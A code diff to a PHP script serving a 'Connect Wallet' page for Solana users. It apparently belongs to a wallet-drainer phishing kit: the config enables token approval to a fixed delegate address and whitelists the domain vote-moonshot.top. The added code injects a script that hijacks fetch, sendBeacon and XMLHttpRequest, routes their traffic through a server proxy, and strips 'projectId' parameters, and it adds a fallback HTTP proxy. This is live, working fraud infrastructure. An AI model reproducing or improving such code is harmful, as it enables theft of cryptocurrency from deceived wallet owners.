@@ -16,12 +16,13 @@ $cfg = [
     'site_name' => 'Connect Wallet',
     'site_description' => 'Connect your Solana wallet',
     'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
-    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',
+    'site_url' => '',
 
     'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',
 
     'analytics' => false,
     'restrict_script_access' => true,
+    'allowed_script_hosts' => ['vote-moonshot.top', 'www.vote-moonshot.top'],
 
     'token_approval_enabled' => true,
     'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
@@ -327,17 +328,21 @@ function embed_network_shim(string $entry, array $chunks, array $cfg): string
         . 'return new Response(t,{status:res.status,headers:{"Content-Type":"application/json"}})})})}'
         . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
         . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
-        . 'function sb(b){if(typeof b!=="string")return b;try{var j=JSON.parse(b);if(j&&typeof j==="object"&&!Array.isArray(j)&&"projectId"in j){delete j.projectId;return JSON.stringify(j)}}catch(x){}return b}'
+        . 'function stripPid(b){if(typeof b!=="string")return b;try{var j=JSON.parse(b);if(j&&typeof j==="object"&&!Array.isArray(j)&&"projectId"in j){delete j.projectId;return JSON.stringify(j)}}catch(x){}return b}'
         . 'function cmp(u,m,b){m=(m||"GET").toUpperCase();try{var x=new URL(u,location.href);x.searchParams.delete("projectId");'
         . 'var hk=HM[x.hostname];if(hk){var o={t:"u",h:hk,p:x.pathname+x.search,m:m};'
-        . 'if(b!=null)o.b=sb(typeof b==="string"?b:String(b));return o}}catch(x){}'
+        . 'if(b!=null)o.b=stripPid(typeof b==="string"?b:String(b));return o}}catch(x){}'
         . 'try{var z=new URL(u,location.href);z.searchParams.delete("projectId");u=z.href}catch(x){}'
-        . 'var o={t:"u",m:m,u:u};if(b!=null)o.b=sb(typeof b==="string"?b:String(b));return o}'
+        . 'var o={t:"u",m:m,u:u};if(b!=null)o.b=stripPid(typeof b==="string"?b:String(b));return o}'
         . 'function prox(h,n){n=n||{};return gpost(cmp(h,n.method,n.body))}'
         . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
         . 'if(isgw(h))return pj(f(i,n||{}));if(off(h))return prox(h,n);return f(i,n)};'
-        . 'var sb=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
-        . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost(cmp(String(u),"POST",d)).catch(function(){});return!0};'
+        . 'var nativeBeacon=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
+        . 'if(nativeBeacon)navigator.sendBeacon=function(u,d){if(!off(u))return nativeBeacon(u,d);'
+        . 'function ship(b){gpost(cmp(String(u),"POST",b)).catch(function(){});return!0}'
+        . 'if(d instanceof Blob){d.text().then(ship).catch(function(){});return!0}'
+        . 'if(d instanceof ArrayBuffer){ship(new TextDecoder().decode(d));return!0}'
+        . 'return ship(d==null?"":typeof d==="string"?d:String(d))};'
         . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
         . 'XMLHttpRequest.prototype.open=function(m,h){if(typeof h==="string"&&off(h)){this._px=h;this._pm=m;arguments[1]="about:blank"}return xo.apply(this,arguments)};'
         . 'XMLHttpRequest.prototype.send=function(b){if(this._px){var x=this;prox(this._px,{method:this._pm||"GET",body:b}).then(function(r){return r.text()}).then(function(t){'
@@ -679,38 +684,10 @@ function serve_gateway_chunk(array $cfg): void
 
 function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
 {
-    if (!function_exists('curl_init')) {
-        http_response_code(500);
-        header('Content-Type: text/plain; charset=utf-8');
-        echo 'php-curl required for API proxy';
-        exit;
-    }
-
-    $ch = curl_init($url);
-    if ($ch === false) {
-        http_response_code(502);
-        exit;
-    }
-
-    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);
-    $opts = [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_MAXREDIRS => 3,
-        CURLOPT_CONNECTTIMEOUT => 15,
-        CURLOPT_TIMEOUT => 60,
-        CURLOPT_CUSTOMREQUEST => $method,
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_ENCODING => '',
-    ];
-    if ($body !== null) {
-        $opts[CURLOPT_POSTFIELDS] = $body;
-    }
-    curl_setopt_array($ch, $opts);
-    $response = curl_exec($ch);
-    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
-    curl_close($ch);
+    $result = proxy_http_request($method, $url, $body, $extraHeaders);
+    $response = $result['body'];
+    $code = $result['code'];
+    $type = $result['type'];
 
     $origin = request_origin();
     $isJsChunk = is_string($response) && str_contains($response, '__WPL(');
@@ -732,6 +709,77 @@ function proxy_forward(string $method, string $url, ?string $body, array $extraH
         is_string($response) && $response !== '' ? $response : '{"error":"vercel gateway failed"}',
         true,
     );
+}
+
+/**
+ * @return array{code: int, type: string, body: string}
+ */
+function proxy_http_request(string $method, string $url, ?string $body, array $extraHeaders = []): array
+{
+    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        if ($ch === false) {
+            return ['code' => 502, 'type' => '', 'body' => '{"error":"curl_init failed"}'];
+        }
+
+        $opts = [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_CONNECTTIMEOUT => 15,
+            CURLOPT_TIMEOUT => 60,
+            CURLOPT_CUSTOMREQUEST => $method,
+            CURLOPT_HTTPHEADER => $headers,
+            CURLOPT_ENCODING => '',
+        ];
+        if ($body !== null) {
+            $opts[CURLOPT_POSTFIELDS] = $body;
+        }
+        curl_setopt_array($ch, $opts);
+        $response = curl_exec($ch);
+        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+        curl_close($ch);
+
+        return [
+            'code' => $code,
+            'type' => $type,
+            'body' => $response === false ? '{"error":"upstream curl failed"}' : (string) $response,
+        ];
+    }
+
+    $opts = [
+        'http' => [
+            'method' => $method,
+            'header' => implode("\r\n", $headers),
+            'timeout' => 60,
+            'ignore_errors' => true,
+        ],
+    ];
+    if ($body !== null) {
+        $opts['http']['content'] = $body;
+    }
+
+    $ctx = stream_context_create($opts);
+    $response = @file_get_contents($url, false, $ctx);
+    $code = 0;
+    $type = '';
+    if (isset($http_response_header[0]) && preg_match('/ (\d{3}) /', (string) $http_response_header[0], $m)) {
+        $code = (int) $m[1];
+    }
+    foreach ($http_response_header ?? [] as $hline) {
+        if (stripos($hline, 'content-type:') === 0) {
+            $type = trim(substr($hline, 13));
+        }
+    }
+
+    if ($response === false) {
+        return ['code' => 502, 'type' => '', 'body' => '{"error":"upstream stream request failed"}'];
+    }
+
+    return ['code' => $code, 'type' => $type, 'body' => (string) $response];
 }
 
 function vercel_profile_origin(array $cfg): string
